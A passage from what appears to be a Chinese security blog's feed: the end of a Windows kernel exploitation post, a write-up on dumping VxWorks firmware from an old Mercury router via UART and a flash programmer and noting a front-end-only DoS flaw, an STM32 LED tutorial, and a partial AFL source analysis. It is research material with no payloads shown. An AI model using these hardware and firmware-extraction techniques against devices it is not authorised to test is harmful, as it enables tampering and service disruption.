class="built_in">printf</span>(<span class="string">&quot;value a: %lld, b: %lld\nreal info %d\n&quot;</span>, a, b, info);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">CloseHandle</span>(hDevice);</span><br><span class="line">    std::cout &lt;&lt; <span class="string">&quot;Success close\n&quot;</span>;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h1 id="参考"><a class="markdownIt-Anchor" href="#参考"></a> 参考</h1><p><a href="https://www.bilibili.com/video/BV1QJ411A7kR">https://www.bilibili.com/video/BV1QJ411A7kR</a></p><p><a href="https://space.bilibili.com/1992190180/">https://space.bilibili.com/1992190180/</a></p><p><a href="https://learn.microsoft.com/zh-cn/windows-hardware/drivers/kernel/xianzh">https://learn.microsoft.com/zh-cn/windows-hardware/drivers/kernel/xianzh</a></p>]]></content>
    
    
    <summary type="html">&lt;p&gt;开始做HEVD来熟悉windows的内核漏洞利用方式时，发现大多数的资料依旧基于windows7，但是目前主流的操作系统已经是win10，所以还是得更上时代潮流的&lt;/p&gt;
&lt;p&gt;文章已在先知社区投稿：&lt;a href=&quot;https://xz.aliyun.com/t/13363&quot;&gt;https://xz.aliyun.com/t/13363&lt;/a&gt;&lt;/p&gt;</summary>
    
    
    
    <category term="notes" scheme="https://joe1sn.eu.org/categories/notes/"/>
    
    
    <category term="kernel" scheme="https://joe1sn.eu.org/tags/kernel/"/>
    
    <category term="windows" scheme="https://joe1sn.eu.org/tags/windows/"/>
    
    <category term="pwn" scheme="https://joe1sn.eu.org/tags/pwn/"/>
    
  </entry>
  
  <entry>
    <title>【漏洞挖掘】记一次痛苦的VxWorks路由器漏洞挖掘</title>
    <link href="https://joe1sn.eu.org/2024/01/12/MW300R-vuln/"/>
    <id>https://joe1sn.eu.org/2024/01/12/MW300R-vuln/</id>
    <published>2024-01-12T06:41:03.000Z</published>
    <updated>2024-01-12T07:58:42.061Z</updated>
    
    <content type="html"><![CDATA[<p>问题多又多</p><span id="more"></span><h1 id="记一次痛苦的vxworks路由器漏洞挖掘"><a class="markdownIt-Anchor" href="#记一次痛苦的vxworks路由器漏洞挖掘"></a> 记一次痛苦的VxWorks路由器漏洞挖掘</h1><p>路由器很老了，是Mercury MW300R的某个版本，网上找不到固件，所以最开始想用uart进shell</p><p><img src="https://img.joe1sn.top/uploads/big/71cdd1353aa2a65e2a93bbe74505794c.png" alt="image-20240112140428176" /></p><p>拆开过后可以快速找到UART引脚</p><p><img src="https://img.joe1sn.top/uploads/big/d81c03bcc326000e5b9b614d815ff5c7.png" alt="image-20240112153117629" /></p><h2 id="uart调试"><a class="markdownIt-Anchor" href="#uart调试"></a> UART调试</h2><h3 id="i-打开uart"><a class="markdownIt-Anchor" href="#i-打开uart"></a> I 打开UART</h3><p>路由器断电，然后把万用表调到测接地，黑笔随便找一个电路板上的接口（我用的wifi天线的），红笔测口子，响的那个就是接地</p><p>接着路由器连上电源，万用表调到测电压，黑笔随便找一个电路板上的接口，红笔挨个测试接口</p><ul><li>如果为3.3V左右，那么是电源线（3.3V）</li><li>如果为0V，为接地（GND）</li><li>如果为2.5V左右，为TXD（路由器的Write）</li><li>如果不断跳动，为RXD（路由器的Read）</li></ul><p><strong>然后第一点不寻常的就来了</strong></p><p>我在测试的时候只能通过排除法筛选出了RXD，我的RXD一直为0V</p><p><img src="https://img.joe1sn.top/uploads/big/df439aaa4d8867c9c8b18f22a95516a4.png" alt="image-20240112141505800" /></p><p>这个时候通过</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">FT232: 3.3V -&gt; 路由器: 3.3v</span><br><span class="line">FT232: GND  -&gt; 路由器: GND</span><br><span class="line">FT232: RXD  -&gt; 路由器: TXD</span><br><span class="line">FT232: TXD  -&gt; 路由器: RXD</span><br></pre></td></tr></table></figure><p><img src="https://img.joe1sn.top/uploads/big/5ad1558352398a3e6b14c9e3e5c46073.png" alt="image-20240112141907775" /></p><p><strong>插上路由器电源线，但是不插插头</strong>，通过串口就能连上了</p><p><img src="https://img.joe1sn.top/uploads/big/233aa50fe42f5f25c24eac6239ebf2ab.png" alt="image-20240112141950855" /></p><p><img src="https://img.joe1sn.top/uploads/big/82994c0bdd9f2b4aea62b9d6e2c1e53e.png" alt="image-20240112142014239" /></p><p>但是会发现无法输入，导致设备一直重启，在这个地方无法停下autoboot，很显然需要输入来打断</p><p><img src="https://img.joe1sn.top/uploads/big/c1236c0af9b717b34e85926972b4206c.png" alt="image-20240112142420406" /></p><p>但是路由器的RXD一直为0V，说明并没有开启向路由器写入的功能，通过仔细观察电路，发现RXD出口有下面几个接口，不断测试发现RXD可以在下方的焊点使用</p><p><img src="https://img.joe1sn.top/uploads/big/c3d16dc94aba9ff8146c2856f4ca05b6.png" alt="image-20240112143120491" /></p><p><img src="https://img.joe1sn.top/uploads/big/3afacc1f2ea7063dd9974ef16cb89012.png" alt="img" /></p><p>但是我没有架子，而且焊点太小了（本人电烙铁太菜），所以折弯了一根曲别针来传信号</p><p><img src="https://img.joe1sn.top/uploads/big/0e9613116215b8795f1d5ed68339eab5.png" alt="image-20240112143216503" /></p><h3 id="ii-开始调试-a"><a class="markdownIt-Anchor" href="#ii-开始调试-a"></a> II 开始调试 A</h3><p><img src="https://img.joe1sn.top/uploads/big/571f2be4829451e211dcf8573f43f4c4.png" alt="image-20240112143502782" /></p><p>能用的功能特别少，而且tftp功能用不了，不过<code>md</code>可以查看内存</p><p><img src="https://img.joe1sn.top/uploads/big/312c1b8e77e551c29417858947e95854.png" alt="image-20240112143630442" /></p><p>其实这里可以<strong>参考</strong><a href="https://e3pem.github.io/2019/07/03/IoT/%E6%8F%90%E5%8F%96tl-wdr5620%E5%9B%BA%E4%BB%B6/">这篇博客</a>进行dump提取的，但是当时没想到。</p><h3 id="iii-开始调试-b"><a class="markdownIt-Anchor" href="#iii-开始调试-b"></a> III 开始调试 B</h3><p>在进入uboot的时候发现<code>ctrl+C</code>会打断一个TP-Link的shell</p><p><img src="https://img.joe1sn.top/uploads/big/2d96f7d56b8ae8fe623b18558e80d79a.png" alt="img" /></p><p>后续发现插上插头后有概率会停在这里</p><p><img src="https://img.joe1sn.top/uploads/big/7474c84098dc952a5c5eee5346ead3cc.png" alt="image-20240112144335565" /></p><p>使用命令查看内存分配</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flash -layout</span><br></pre></td></tr></table></figure><p><img src="https://img.joe1sn.top/uploads/big/8577ceadac971f3d42c2aa0655d187ff.png" alt="image-20240112144442000" /></p><p>看到这里我才明白最开始进的是uboot的控制窗口，这里才是真正的Flash存储的启动点</p><p>修改了<a href="https://e3pem.github.io/2019/07/03/IoT/%E6%8F%90%E5%8F%96tl-wdr5620%E5%9B%BA%E4%BB%B6/">这篇博客</a>的脚本按照一样的思路试图提取固件出来，但是binwalk没有任何识别，所以UART走到尽头了</p><h2 id="cha341a法"><a class="markdownIt-Anchor" href="#cha341a法"></a> CHA341A法</h2><p>就是传统的飞线法，路由器上能用芯片夹的就两个芯片，用CHA341编程器读取一下就知道了（记得装驱动）</p><p>关于组装可以看<a href="https://macoshome.com/hackintosh/hcourse/8672.html">这篇</a></p><p><strong>芯片没有识别到，但是重要的是芯片存储的大小</strong>，通过上flash layout可以看到总空间大小是1024KB=1MB，选择大小为1MB的芯片就好了</p><p><img src="https://img.joe1sn.top/uploads/big/3f5f93b6fe9ccdfcfc54dd34435e866e.png" alt="image-20240112145236126" /></p><p>用binwalk看一下，发现是VxWorks的系统，而且根本就没有Unix/Linux的文件系统，而是使用了<code>Wind River </code>文件系统，怪不得所有东西都是一坨，而且知道了程序入口是<code>0x80001000</code></p><p><img src="https://img.joe1sn.top/uploads/big/d9c9135a8be26c1216591ef7d8813e15.png" alt="image-20240112150503842" /></p><p>可以参考<a href="https://e3pem.github.io/2019/07/03/IoT/%E6%8F%90%E5%8F%96tl-wdr5620%E5%9B%BA%E4%BB%B6/">这篇</a>来慢慢提取，不过也可以直接</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">binwalk -Me MW300R.bin</span><br></pre></td></tr></table></figure><p><img src="https://img.joe1sn.top/uploads/big/a2348594065a762a3cc1983166df2c7b.png" alt="image-20240112150701769" /></p><p>看上去挺多的，其实根本不慌，随便看一个</p><p><img src="https://img.joe1sn.top/uploads/big/c0af0c85c57c40b65475e67c21787054.png" alt="image-20240112150746160" /></p><p>再看看<code>Wind River</code>那段的数据，按顺序就对对应的不同文件了</p><p><img src="https://img.joe1sn.top/uploads/big/e0cb52fbcca6ca98ff37d6673d177fc3.png" alt="image-20240112150918772" /></p><p>可以按照对应的格式写脚本提取，不过本文的中心并不在这儿。</p><p>在提取的时候发现</p><p><img src="https://img.joe1sn.top/uploads/big/f63e1cf98c122aa8c596bfb7af7ce99c.png" alt="image-20240112151253608" /></p><p>把<code>49200</code>文件特殊看一下</p><p><img src="https://img.joe1sn.top/uploads/big/249494f2709907f5dc0a18650d8fab8a.png" alt="image-20240112151338519" /></p><p>恭喜，找到了主要文件的</p><p>用ida 32位 MIPS大端序打开</p><p><img src="https://img.joe1sn.top/uploads/big/60ee931f155256c22afa57d55644622f.png" alt="image-20240112151500456" /></p><p>根据前文提到的入口地址<code>0x80001000</code>设置入口</p><p><img src="https://img.joe1sn.top/uploads/big/ce3b8f706d348b5b68a467ce65dc9f50.png" alt="image-20240112151550592" /></p><p>在开头按下C就IDA就开始自动分析了</p><p><img src="https://img.joe1sn.top/uploads/big/b5cdbb90e788e174da8417fd777b9807.png" alt="image-20240112151715384" /></p><h2 id="漏洞挖掘"><a class="markdownIt-Anchor" href="#漏洞挖掘"></a> 漏洞挖掘</h2><p>上面的二进制分析起来还是有难度的，不过用常规思路（包括web）即可</p><p>比如一个很明显的DOS洞，很明显只做了前端校验</p><p><img src="https://img.joe1sn.top/uploads/big/1d769daf0f6578f0f773a90d36c2d831.png" alt="image-20240112151913239" /></p><p>直接把路由器打崩，得重启才能恢复正常工作</p><h1 id="引用"><a class="markdownIt-Anchor" href="#引用"></a> 引用</h1><p><a href="https://paper.seebug.org/2024">https://paper.seebug.org/2024</a></p><p><a href="https://e3pem.github.io/2019/07/03/IoT/%E6%8F%90%E5%8F%96tl-wdr5620%E5%9B%BA%E4%BB%B6/">https://e3pem.github.io/2019/07/03/IoT/提取tl-wdr5620固件/</a></p><p><a href="https://blog.quarkslab.com/reverse-engineering-a-vxworks-os-based-router.html">https://blog.quarkslab.com/reverse-engineering-a-vxworks-os-based-router.html</a></p>]]></content>
    
    
    <summary type="html">&lt;p&gt;问题多又多&lt;/p&gt;</summary>
    
    
    
    <category term="CVE" scheme="https://joe1sn.eu.org/categories/CVE/"/>
    
    
    <category term="cve" scheme="https://joe1sn.eu.org/tags/cve/"/>
    
    <category term="漏洞挖掘" scheme="https://joe1sn.eu.org/tags/%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98/"/>
    
  </entry>
  
  <entry>
    <title>【STM32】1.点灯大师</title>
    <link href="https://joe1sn.eu.org/2023/09/10/stm32-1-light/"/>
    <id>https://joe1sn.eu.org/2023/09/10/stm32-1-light/</id>
    <published>2023-09-10T11:51:40.000Z</published>
    <updated>2023-09-10T13:11:53.162Z</updated>
    
    <content type="html"><![CDATA[<p>如何三小时之内，从0开始学会stm32点灯</p><p>（其实是想验证下发的芯片是不是好的）</p><span id="more"></span><h1 id="准备工作"><a class="markdownIt-Anchor" href="#准备工作"></a> 准备工作</h1><p>我是在JD上随便买的一家，有</p><p>STM32F103C8T6，面包板，USB转TTL，显示器…</p><p>缺啥少啥买配件就行了</p><h1 id="1软件"><a class="markdownIt-Anchor" href="#1软件"></a> 1.软件</h1><p>由于我们是小白，所以暂时不需要看电路啥的，直接先把软件装上。</p><ul><li>STM32CubeIDE</li></ul><p><strong>这里我参考了：BV1HM411b78E</strong></p><iframe src="//player.bilibili.com/player.html?aid=522761379&bvid=BV1HM411b78E&cid=964014224&p=1" scrolling="no" border="0" frameborder="no" framespacing="0" allowfullscreen="true"> </iframe><p>或者知乎的<a href="https://zhuanlan.zhihu.com/p/321845090">https://zhuanlan.zhihu.com/p/321845090</a></p><p>知乎的有一个模拟程序</p><ul><li>驱动（因为我是USB转TTL）：CH340-驱动，这个你可以找客服要，一般都会发给你的</li><li>烧录软件：FLYMCU</li></ul><p>首先需要熟悉的就是STM32CubeIDE的使用，可以参考上面的B站视频后者知乎，这里还有：<a href="https://www.bilibili.com/video/BV13B4y1y7yk">https://www.bilibili.com/video/BV13B4y1y7yk</a></p><h1 id="2硬件"><a class="markdownIt-Anchor" href="#2硬件"></a> 2.硬件</h1><p>这个是始终绕不开的（除非你用EDA）</p><p><strong>1.面包板</strong></p><p>有时间可以参考：<a href="https://www.bilibili.com/video/BV1gz4y1Z7N7">https://www.bilibili.com/video/BV1gz4y1Z7N7</a></p><p>或者</p><p><img src="https://img.joe1sn.top/uploads/big/2e4be1b02468f7dc6f30ca5fa39743b3.png" alt="image-20230910201039379" /></p><p>导线就是这样连接的</p><p><strong>2.STM32F103C8T6</strong></p><p>显示再IDE中的</p><p><img src="https://img.joe1sn.top/uploads/big/240043662443e27813cb75699f9d0052.png" alt="image-20230910201448666" /></p><p>比如这里的<code>PA0</code>就是代表芯片的A0接口</p><p><img src="https://img.joe1sn.top/uploads/big/fa1182386227986f3a24676b4578f5b7.png" alt="image-20230910201538474" /></p><p>这里的<code>GPIO_Output</code>代表的是<code>信号输出</code>（严格来说不是这样的）。具体的设置可以参考<a href="https://www.bilibili.com/video/BV1ja411J766">https://www.bilibili.com/video/BV1ja411J766</a></p><p>在<code>main.c</code>中的<code>main</code>函数的<code>while</code>死循环里面有</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* Infinite loop */</span></span><br><span class="line"><span class="comment">/* USER CODE BEGIN WHILE */</span></span><br><span class="line"><span class="keyword">while</span> (<span class="number">1</span>)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="comment">/* USER CODE END WHILE */</span></span><br><span class="line"> HAL_GPIO_TogglePin(GPIOA, LED1_Pin);</span><br><span class="line"> HAL_Delay(<span class="number">200</span>);</span><br><span class="line"> HAL_GPIO_TogglePin(GPIOA, LED2_Pin);</span><br><span class="line"> HAL_Delay(<span class="number">200</span>);</span><br><span class="line">  <span class="comment">/* USER CODE BEGIN 3 */</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><code>LED1_Pin</code>和<code>LED2_Pin</code>是我给的命名，然后编译就好了</p><p><strong>3.烧录</strong></p><p>可以参考</p><p><a href="https://www.bilibili.com/video/BV1wR4y1y7E2/">https://www.bilibili.com/video/BV1wR4y1y7E2/</a></p><p><a href="https://www.bilibili.com/video/BV1P24y1L7Ho">https://www.bilibili.com/video/BV1P24y1L7Ho</a></p><p>PA9&lt;–&gt;RXD</p><p>PA10&lt;–&gt;TXD</p><p>设置条线：</p><p><img src="https://img.joe1sn.top/uploads/big/27a10a6eafd1d619725072f214b3a299.png" alt="image-20230910211049260" /></p><p>开始FLYMCU烧录</p><p><img src="https://img.joe1sn.top/uploads/big/90fd0e71f90e0c6eca76f4411c53e554.png" alt="image-20230910204832081" /></p><p>选hex文件烧进去就行了</p><p><strong>如果你像我上图那样外接电源</strong>，在烧录的时候也是需要将其插入USB接口中的</p><h1 id="3电路"><a class="markdownIt-Anchor" href="#3电路"></a> 3.电路</h1><p><strong>不知道二极管功率的最好加上1k欧的电阻</strong>，信号时从A0和A1输出，最后流向的是G跳线（参考上图）</p><p>调回boot条线，按下复位键：</p><p><img src="https://img.joe1sn.top/uploads/big/f06da32c2c7c09a43ba0ac9ac1e50929.png" alt="image-20230910210541362" /></p><p>成功点亮</p>]]></content>
    
    
    <summary type="html">&lt;p&gt;如何三小时之内，从0开始学会stm32点灯&lt;/p&gt;
&lt;p&gt;（其实是想验证下发的芯片是不是好的）&lt;/p&gt;</summary>
    
    
    
    <category term="hardware" scheme="https://joe1sn.eu.org/categories/hardware/"/>
    
    
    <category term="stm32" scheme="https://joe1sn.eu.org/tags/stm32/"/>
    
  </entry>
  
  <entry>
    <title>【源码分析】AFL源代码分析</title>
    <link href="https://joe1sn.eu.org/2023/07/22/afl-source/"/>
    <id>https://joe1sn.eu.org/2023/07/22/afl-source/</id>
    <published>2023-07-22T00:41:03.000Z</published>
    <updated>2024-01-10T04:45:48.085Z</updated>
    
    <content type="html"><![CDATA[<p>其实还是挺简单的</p><span id="more"></span><p><img src="https://img.joe1sn.top/uploads/big/2ce8fd381c9b8cd5f9ebfc1e137790c7.png" alt="image-20230722090502823" /></p><p>在一次期末报告里面做了这个报告</p><p><strong>关于AFL的基本步骤</strong></p><p>工作流程基本上可以用 5 个步骤来描述：预处理、输入构建、输入选择、评估、后模糊测试。 真正的内核处理是步骤 2 到 4</p><ul><li><p>预处理</p><p>分析和获取有用信息，使用PIN，符号执行，污点检查</p><p>黑盒白盒</p></li><li><p>输入构建</p><p>从数据 S（种子）产生大量变异数据 I。</p></li><li><p>输入选择</p><p>过滤无效数据，优化模糊测试</p></li><li><p>评估</p><p>大多数关于模糊的研究集中在两个指标上：覆盖率和利用漏洞的平均时间</p></li></ul><h1 id="源码分析"><a class="markdownIt-Anchor" href="#源码分析"></a> 源码分析</h1><h2 id="编译插桩"><a class="markdownIt-Anchor" href="#编译插桩"></a> 编译插桩</h2><h3 id="afl-gcc"><a class="markdownIt-Anchor" href="#afl-gcc"></a> afl-gcc</h3><p>根据使用方法，首先是使用<code>afl-gcc</code>进行编译，在编译时就完成插桩</p><p><img src="https://img.joe1sn.top/uploads/big/97bdf6ef6f906c0fe4f25c248f13ece7.png" alt="image-20230722090843228" /></p><p>本就是是包裹的GCC盒CLANG</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">char</span>** argv)</span> &#123;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (isatty(<span class="number">2</span>) &amp;&amp; !getenv(<span class="string">&quot;AFL_QUIET&quot;</span>)) &#123;</span><br><span class="line"></span><br><span class="line">    SAYF(cCYA <span class="string">&quot;afl-cc &quot;</span> cBRI VERSION cRST <span class="string">&quot; by &lt;lcamtuf@google.com&gt;\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">  &#125; <span class="keyword">else</span> be_quiet = <span class="number">1</span>;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (argc &lt; <span class="number">2</span>) &#123;</span><br><span class="line"></span><br><span class="line">    SAYF(<span class="string">&quot;\n&quot;</span></span><br><span class="line">         <span class="string">&quot;This is a helper application for afl-fuzz. It serves as a drop-in replacement\n&quot;</span></span><br><span class="line">         <span class="string">&quot;for gcc or clang, letting you recompile third-party code with the required\n&quot;</span></span><br><span class="line">         <span class="string">&quot;runtime instrumentation. A common use pattern would be one of the following:\n\n&quot;</span></span><br><span class="line"></span><br><span class="line">         <span class="string">&quot;  CC=%s/afl-gcc ./configure\n&quot;</span></span><br><span class="line">         <span class="string">&quot;  CXX=%s/afl-g++ ./configure\n\n&quot;</span></span><br><span class="line"></span><br><span class="line">         <span class="string">&quot;You can specify custom next-stage toolchain via AFL_CC, AFL_CXX, and AFL_AS.\n&quot;</span></span><br><span class="line">         <span class="string">&quot;Setting AFL_HARDEN enables hardening optimizations in the compiled code.\n\n&quot;</span>,</span><br><span class="line">         BIN_PATH, BIN_PATH);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line"></span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  find_as(argv[<span class="number">0</span>]);</span><br><span class="line"></span><br><span class="line">  edit_params(argc, argv);</span><br><span class="line"></span><br><span class="line">  execvp(cc_params[<span class="number">0</span>], (<span class="type">char</span>**)cc_params);</span><br><span class="line"></span><br><span class="line">  FATAL(<span class="string">&quot;Oops, failed to execute &#x27;%s&#x27; - check your PATH&quot;</span>, cc_params[<span class="number">0</span>]);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><code>SAYF</code>就是<code>fprintf</code>函数，检测到参数小于2的时候报错并退出</p><ul><li>使用<code>find_as</code>进行参数的解析到自身程序路径，找到<code>afl-as</code>的afl汇编器</li><li><code>edit_params</code>中，解析参数，设置自生对应的编译器，获得和设置一系列环境变量，最后得到的<code>cc_params</code>就是编译参数</li><li><code> execvp(cc_params[0], (char**)cc_params);</code>，通过前面找到的汇编器<code>as_path</code>和参数创建进程进行插桩编译。（具体就是替换了程序名称之类的，源码很简单）</li></ul><h3 id="afl-as"><a class="markdownIt-Anchor" href="#afl-as"></a> afl-as</h3><p><strong>main</strong></p><p>进入main创建了一些列变量然后就是在<code>a</code> 中将 <code>cc_params</code> 转为<code>as_params</code></p><p><strong>add_instrumentation</strong></p><p>重头函数</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">while</span> (fgets(line, MAX_LINE, inf)) &#123;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* In some cases, we want to defer writing the instrumentation trampoline</span></span><br><span class="line"><span class="comment">       until after all the labels, macros, comments, etc. If we&#x27;re in this</span></span><br><span class="line"><span class="comment">       mode, and if the line starts with a tab followed by a character, dump</span></span><br><span class="line"><span class="comment">       the trampoline now. */</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (!pass_thru &amp;&amp; !skip_intel &amp;&amp; !skip_app &amp;&amp; !skip_csect &amp;&amp; instr_ok &amp;&amp;</span><br><span class="line">        instrument_next &amp;&amp; line[<span class="number">0</span>] == <span class="string">&#x27;\t&#x27;</span> &amp;&amp; <span class="built_in">isalpha</span>(line[<span class="number">1</span>])) &#123;</span><br><span class="line"></span><br><span class="line">      <span class="built_in">fprintf</span>(outf, use_64bit ? trampoline_fmt_64 : trampoline_fmt_32,</span><br><span class="line">              R(MAP_SIZE));</span><br><span class="line"></span><br><span class="line">      instrument_next = <span class="number">0</span>;</span><br><span class="line">      ins_lines++;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">    ....</span><br><span class="line">    ....</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>所以，AFL的代码插桩，就是在将源文件编译为汇编代码后，通过<code>afl-as</code>完成。开始重写汇编指令，准备在分支处插入代码</p><p>先看看32位，64位和这个也差不多</p><p><code>trampoline_fmt_32</code></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">static const u8* trampoline_fmt_32 =</span><br><span class="line"></span><br><span class="line">  &quot;\n&quot;</span><br><span class="line">  &quot;/* --- AFL TRAMPOLINE (32-BIT) --- */\n&quot;</span><br><span class="line">  &quot;\n&quot;</span><br><span class="line">  &quot;.align 4\n&quot;</span><br><span class="line">  &quot;\n&quot;</span><br><span class="line">  &quot;leal -16(%%esp), %%esp\n&quot;</span><br><span class="line">  &quot;movl %%edi,  0(%%esp)\n&quot;</span><br><span class="line">  &quot;movl %%edx,  4(%%esp)\n&quot;</span><br><span class="line">  &quot;movl %%ecx,  8(%%esp)\n&quot;</span><br><span class="line">  &quot;movl %%eax, 12(%%esp)\n&quot;</span><br><span class="line">  &quot;movl $0x%08x, %%ecx\n&quot;</span><br><span class="line">  &quot;call __afl_maybe_log\n&quot;</span><br><span class="line">  &quot;movl 12(%%esp), %%eax\n&quot;</span><br><span class="line">  &quot;movl  8(%%esp), %%ecx\n&quot;</span><br><span class="line">  &quot;movl  4(%%esp), %%edx\n&quot;</span><br><span class="line">  &quot;movl  0(%%esp), %%edi\n&quot;</span><br><span class="line">  &quot;leal 16(%%esp), %%esp\n&quot;</span><br><span class="line">  &quot;\n&quot;</span><br><span class="line">  &quot;/* --- END --- */\n&quot;</span><br><span class="line">  &quot;\n&quot;;</span><br></pre></td></tr></table></figure><p>这就是汇编，听chatGPT说</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">section .text</span><br><span class="line">global _start</span><br><span class="line"></span><br><span class="line">_start:</span><br><span class="line">    lea esp, [esp-16]      ; leal -16(%esp), %esp</span><br><span class="line">    mov [esp], edi         ; movl %edi, 0(%esp)</span><br><span class="line">    mov [esp+4], edx       ; movl %edx, 4(%esp)</span><br><span class="line">    mov [esp+8], ecx       ; movl %ecx, 8(%esp)</span><br><span class="line">    mov [esp+12], eax      ; movl %eax, 12(%esp)</span><br><span class="line">    mov ecx, 0x08000000    ; movl $0x%08x, %ecx</span><br><span class="line">    call __afl_maybe_log   ; call __afl_maybe_log</span><br><span class="line">    mov eax, [esp+12]      ; movl 12(%esp), %eax</span><br><span class="line">    mov ecx, [esp+8]       ; movl 8(%esp), %ecx</span><br><span class="line">    mov edx, [esp+4]       ; movl 4(%esp), %edx</span><br><span class="line">    mov edi, [esp]         ; movl 0(%esp), %edi</span><br><span class="line">    lea esp, [esp+16]      ; leal 16(%esp), %esp</span><br></pre></td></tr></table></figure><p>32位是经典的栈传参，这里使用对esp的移动实现了从<code>edi</code> <code>edx</code> <code>ecx</code> <code>eax</code>的保存，然后又将<code>ecx</code>设置为了0x08000000，这个是chatGPT翻译错了，正确的理解是&quot;%08x&quot; 是格式说明符，用于将一个整数格式化为一个带有前导零的 8 位十六进制数。例如，“%08x” 将把数字 10 格式化为 “0000000A”。这段汇编仍然是属于C语言的范畴。</p><p>似乎我们下一步要看的是<code>__afl_maybe_log</code>，**但是你就没想过R(MAP_SIZE)**有什么用吗？<code>R(x)</code>的定义是<code>(random() % (x))</code>，所以<code>R(MAP_SIZE)</code>即为0到MAP_SIZE之间的一个随机数。</p><p>因此，在处理到某个分支，需要插入桩代码时，<code>afl-as</code>会生成一个随机数，作为运行时保存在<code>ecx</code>中的值。而这个随机数，便是用于标识这个代码块的key。</p><p>接下来来到<code>__afl_maybe_log</code></p><h2 id="运行"><a class="markdownIt-Anchor" href="#运行"></a> 运行</h2><p>开始fuzz，那么afl如何启动这个程序，可以看看<code>afl-fuzz.c</code>，不过最开始后世设置参数，这里将重要点的部分。</p><p>调用的链条有点复杂首先在L8044</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">skipped_fuzz = fuzz_one(use_argv);</span><br></pre></td></tr></table></figure><p>然后的<code>fuzz_one</code>中，使用队列<code>queue_cur</code>来管理</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">res = calibrate_case(argv, queue_cur, in_buf, queue_cycle - <span class="number">1</span>, <span class="number">0</span>);</span><br></pre></td></tr></table></figure><p>在<code>calibrate_case</code></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (dumb_mode != <span class="number">1</span> &amp;&amp; !no_forkserver &amp;&amp; !forksrv_pid)</span><br><span class="line">  